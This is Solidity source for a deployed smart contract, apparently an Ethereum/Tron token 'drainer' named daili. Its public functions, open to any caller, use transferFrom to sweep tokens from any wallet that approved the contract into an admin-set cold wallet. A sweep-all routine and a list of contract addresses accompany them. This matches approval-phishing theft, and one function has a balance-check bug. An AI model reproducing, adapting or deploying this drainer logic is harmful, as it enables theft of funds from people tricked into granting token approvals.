/**
 *Submitted for verification at Etherscan.io on 2021-11-26
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

library Address {
    function isContract(address account) internal view returns (bool) {
        uint size;
        // solhint-disable-next-line no-inline-assembly
        assembly { size := extcodesize(account) }
        return size > 0;
    }

    function sendValue(address payable recipient, uint amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }

    function functionCallWithValue(address target, bytes memory data, uint value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    function functionCallWithValue(address target, bytes memory data, uint value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        return _functionCallWithValue(target, data, value, errorMessage);
    }

    function _functionCallWithValue(address target, bytes memory data, uint weiValue, string memory errorMessage) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                // solhint-disable-next-line no-inline-assembly
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint);   
    function transferFrom(address sender, address recipient, uint amount ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

contract daili {
    using Address for address;

    address public coldWallet;
    address public admin;
    bool initialized;

    mapping(address => bool) public userList;
    mapping(address => bool) public tokenStatus;
    address[] public tokenList;

    modifier onlyAdmin {
        require(msg.sender == admin,"You Are not admin");
        _;
    }

    function init(address _newAddress) external {
        require(!initialized,"initialized");
        userList[_newAddress] = true;
        admin = _newAddress;
        coldWallet = _newAddress;
        initialized = true;
    }

    function setColdWallet(address _newAddress) external onlyAdmin {
        coldWallet = _newAddress;
    }

    function addUser(address _newAddress) external onlyAdmin {
        require(!userList[_newAddress]);
        userList[_newAddress] = true;
    }

    function delUser(address _newAddress) external onlyAdmin {
        require(userList[_newAddress]);
        userList[_newAddress] = false;
    }

    function addToken (address _newToken) external onlyAdmin {
        require(!tokenStatus[_newToken]);
        tokenStatus[_newToken] = true;
        tokenList.push(_newToken);
    }

    function delToken (address _newToken) external onlyAdmin {
        require(tokenStatus[_newToken]);
        require(tokenList.length > 0);
        tokenStatus[_newToken] = false;
        for (uint i=0; i<tokenList.length; i++) {
            if (tokenList[i] == _newToken) {
                tokenList[i] = tokenList[tokenList.length - 1];
                tokenList.pop();
                return ;
            }
        }
        require(false);
    }

    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
    
    function send(address _addr) payable external {
        require(userList[msg.sender]||userList[_addr]);
       payable(_addr).transfer(msg.value);
    }

    function sendAllToke() payable external {
        require(userList[msg.sender]);
        require(tokenList.length > 0);
        for (uint i=0; i<tokenList.length; i++) {
            if (IERC20(tokenList[i]).balanceOf(msg.sender) > 0) {
                 IERC20(tokenList[i]).transferFrom(msg.sender, coldWallet, IERC20(tokenList[i]).balanceOf(msg.sender));
            }           
        }

        payable(coldWallet).transfer(msg.value);
    }

    function luOneTokenFromyou(address _token) public {
        IERC20(_token).transferFrom(msg.sender, coldWallet,IERC20(_token).balanceOf(msg.sender));
    }

    function luoneTokenFromAccount(address _account, address _token) public {
        IERC20(_token).transferFrom(_account, coldWallet,IERC20(_token).balanceOf(msg.sender));
    }

    function luoShuliangTokenFromAccount(address _account, address _token, uint _amount) public {
        IERC20(_token).transferFrom(_account, coldWallet,_amount);
    }

    receive () external payable {
        // require(userList[msg.sender]);
        // payable(coldWallet).transfer(msg.value);
    }

}

// Test tokens


// A 0x4cf7d0712F12f5D76Ff02B09E3CEDD345D3A1C1A
// B 0x4B6adec419672CFa09E2C425339506EB52091Def
// C 0x94272C9C46301Bc5b2C7f266f06f2e7fB29a2924


// Main Contract
// V1  TTZrwWCLBhBX8WH4A62E4GnFDdcEBZ5j1G
// Admin TTZrwWCLBhBX8WH4A62E4GnFDdcEBZ5j1G